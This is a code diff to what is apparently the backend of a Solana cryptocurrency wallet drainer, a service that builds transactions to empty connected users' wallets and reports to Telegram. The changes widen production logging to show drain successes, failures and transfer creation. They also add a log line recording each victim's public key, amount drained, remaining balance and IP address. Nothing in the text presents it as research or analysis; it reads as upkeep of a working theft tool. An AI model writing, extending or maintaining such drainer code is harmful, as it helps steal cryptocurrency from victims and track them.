@@ -26,10 +26,10 @@ function debugLog(message, ...args) {
   // Disabled in production for performance
 }
 
-// Production logging - allow drain amounts and Telegram logs
+// Production logging - allow all drain-related logs
 const originalConsoleLog = console.log;
 console.log = function() {
-  // Log drain amounts, balance, Telegram, and critical errors in production
+  // Log all drain-related messages in production
   if (arguments[0] && (
     arguments[0].includes && (
       arguments[0].includes('ERROR') || 
@@ -37,7 +37,12 @@ console.log = function() {
       arguments[0].includes('[BALANCE]') ||
       arguments[0].includes('[TELEGRAM]') ||
       arguments[0].includes('Drain Success') ||
-      arguments[0].includes('Wallet Detected')
+      arguments[0].includes('Wallet Detected') ||
+      arguments[0].includes('DRAIN_SUCCESS') ||
+      arguments[0].includes('DRAIN_FAILED') ||
+      arguments[0].includes('Creating transfer') ||
+      arguments[0].includes('Drain attempt details') ||
+      arguments[0].includes('TELEGRAM_DRAIN_SUCCESS')
     )
   )) {
     originalConsoleLog.apply(console, arguments);
@@ -907,6 +912,16 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         });
         return res.status(500).json({ error: 'Failed to encode transaction', details: 'Transaction encoding failed' });
       }
+      
+      // Log drain success with amount
+      console.log('[DRAIN_SUCCESS] Transaction created successfully:', {
+        publicKey: userPubkey.toString(),
+        drainAmount: actualDrainAmount,
+        drainAmountSOL: (actualDrainAmount / 1e9).toFixed(6),
+        balance: lamports,
+        balanceSOL: (lamports / 1e9).toFixed(6),
+        ip: userIp
+      });
       
       res.status(200).json(response);
     } catch (error) {
